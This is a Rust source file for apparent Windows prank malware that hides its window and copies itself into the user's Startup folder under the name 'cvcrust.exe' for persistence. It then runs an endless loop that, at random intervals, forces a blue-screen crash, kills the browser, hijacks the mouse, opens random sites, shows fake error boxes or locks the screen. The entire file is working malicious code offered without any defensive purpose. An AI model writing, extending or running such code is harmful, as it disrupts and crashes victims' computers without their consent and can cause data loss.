#![windows_subsystem = "windows"]

extern crate alloc;

mod trollages;

use std::sync::mpsc::channel;
use std::time::Duration;
use std::fs::File;
use std::process;
use std::io::copy;
use std::thread;
use rand::Rng;
use std::env;

fn main() {
    persistence();
    trolling_loop()
}

fn trolling_loop() {
    loop {
        // sleep between 50 seconds and 8 minutes
        let random_number = rand::thread_rng().gen_range(50000..=480000);
        thread::sleep(Duration::from_millis(random_number));

        let (sender, receiver) = channel();
        let handle = thread::spawn(move || {
            // 0.03125% chance of bsoding or one bsod every 2:21:20h
            if rand::thread_rng().gen_range(1..33) == 1 {
                bsod::bsod()
            }
            rand_troll();
            // sends response if troll happened
            sender.send(()).unwrap();
        });
        // receives the response, if no response from thread then kill it
        let _ = receiver.recv_timeout(Duration::from_secs(60)).unwrap_or(handle.thread().unpark());
    }
}

fn rand_troll() {
    let rand_num = rand::thread_rng().gen_range(0..9);
    match rand_num {
        0 => trollages::weird_msgbox(),
        1 => trollages::error_msgbox(),
        2 => trollages::jiggly_mouse(),
        3 => trollages::stuck_mouse(),
        4 => trollages::kill_browser(),
        5 => trollages::rand_site(),
        6 => trollages::rand_lmgtfy(),
        7 => trollages::rand_speak(),
        8 => trollages::bloat_start(),
        9 =>trollages::lock(),
        _ => panic!("Unexpected random number generated")
    }
}

fn persistence() {
    let current_buf = env::current_exe().unwrap();
    let exe_parent = current_buf.parent().unwrap().to_str().unwrap();
    let exe_name = current_buf.file_name().unwrap().to_str().unwrap();

    let execution_path = format!("{}\\{}", exe_parent, exe_name);
    let new_path = format!("{}\\{}\\{}", env::var("APPDATA").unwrap(), "Microsoft\\Windows\\Start Menu\\Programs\\Startup" , "cvcrust.exe");

    if execution_path != new_path {
        let mut src = File::open(&execution_path).unwrap();
        let mut dest = File::create(&new_path).unwrap();
        let _ = copy(&mut src,&mut dest).unwrap();
        process::exit(0);
    }

}